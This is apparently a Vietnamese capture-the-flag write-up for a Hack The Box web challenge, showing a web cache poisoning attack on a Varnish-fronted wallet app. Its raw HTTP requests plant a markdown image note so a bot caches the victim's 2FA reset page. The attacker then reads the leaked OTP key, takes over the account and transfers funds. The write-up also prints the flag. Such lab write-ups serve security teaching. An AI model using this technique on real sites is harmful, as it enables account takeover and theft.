# Genesis wallet redemption

## Vul: Web cache poisoing  
_(From @d4rkmod3)_


Varnish chỉ cache các file có extension là js|css|map, svg|ico|jpg|jpeg|gif|png ...

Lợi dụng việc cấu hình route với regex: `/^\/(\w{2})?\/?(setup|reset)-2fa/` => `/reset-2fa.js` sẽ được cache

Ở đây có hai hướng để giải với web cache poisoing

- Tận dụng `req.param[1]` để khai thác XSS + CSRF để lấy optkey của icarus user tạo QR code mới.
- Build local với file đính kèm, lấy session của icarus user. Sau đó genQRCode ở tab console của DevTools.

Mình sẽ làm theo cách thứ 2 cho nhanh:

1. Tạo một transaction với note: `![blabla](http://127.0.0.1/reset-2fa.js)` mục đích là để cho bot gửi một request đến `/^\/(\w{2})?\/?(setup|reset)-2fa/`. Và request này sẽ được cache bởi varnish.
```
POST /api/transactions/create HTTP/1.1
Host: 159.65.89.199:31346
Content-Length: 110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.89.199:31346
Referer: http://159.65.89.199:31346/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJvdHBrZXkiOnRydWUsInZlcmlmaWVkIjp0cnVlLCJpYXQiOjE2NTI5NjQ5NTJ9.BF7kt4CjIFnQ0iNKtkJezmd5E57fg7hGLh30HEbgr3A
Connection: close

{"receiver":"1ea8b3ac0640e44c27b3cb8a258a87f8","amount":"0.00001","note":"![](http://127.0.0.1/reset-2fa.js)"}
```
2. Request đến `/reset-2fa.js` để lấy optkey của icarus user. 
```
GET /reset-2fa.js HTTP/1.1
Host: 127.0.0.1
```
-> genQRCode('OEQRSDJSKQSQS3IA');

3. Login với sesion của icarus user (trên local) -> genQRCode() -> lấy được QR code mới của icarus -> login và chuyển tiền qua account của ta.

**HTB{Fl3w_t00_cl0s3_t0_7h3_d3cept10n_4nd_burn3d!}**